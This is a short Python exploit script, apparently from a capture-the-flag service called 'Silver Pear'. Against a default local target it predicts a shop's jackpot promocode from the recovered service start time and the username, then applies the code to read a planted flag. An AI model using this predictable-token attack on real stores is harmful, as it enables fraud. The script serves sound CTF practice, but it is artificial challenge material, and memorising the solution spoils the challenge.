from __future__ import annotations

import argparse
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
CHECKER = ROOT / "checker"
if str(CHECKER) not in sys.path:
    sys.path.insert(0, str(CHECKER))

from common import (
    create_product_with_flag,
    predict_jackpot_code,
    recover_service_start_unix,
    register_and_login,
)


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Silver Pear predictable jackpot promocode")
    parser.add_argument("target", nargs="?", default="http://127.0.0.1:7777")
    parser.add_argument("--flag", default="FLAG{demo_predictable_wheel}")
    parser.add_argument("--price", type=int, default=4200)
    args = parser.parse_args()

    seller, seller_name, _ = register_and_login(args.target, prefix="v3_seller", role="seller")
    created = create_product_with_flag(seller, args.flag, price=args.price, title_prefix="V3")
    product_id = int(created["product"]["id"])
    slot = created["note_slot"]

    attacker, username, _ = register_and_login(args.target, prefix="wheel", role="buyer")
    wheel = attacker.spin_wheel()
    service_start_unix = recover_service_start_unix(args.target)
    predicted_code = predict_jackpot_code(service_start_unix, username)

    order = attacker.create_order()["order"]
    order = attacker.add_order_item(order["public_id"], product_id)["order"]
    order = attacker.apply_promocode(order["public_id"], predicted_code)["order"]
    notes = attacker.get_notes(product_id)[1]["notes"]

    print(f"username={username}")
    print(f"seller={seller_name}")
    print(f"wheel_outcome={wheel['outcome']}")
    print(f"predicted_code={predicted_code}")
    print(f"product_id={product_id}")
    print(notes[slot])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
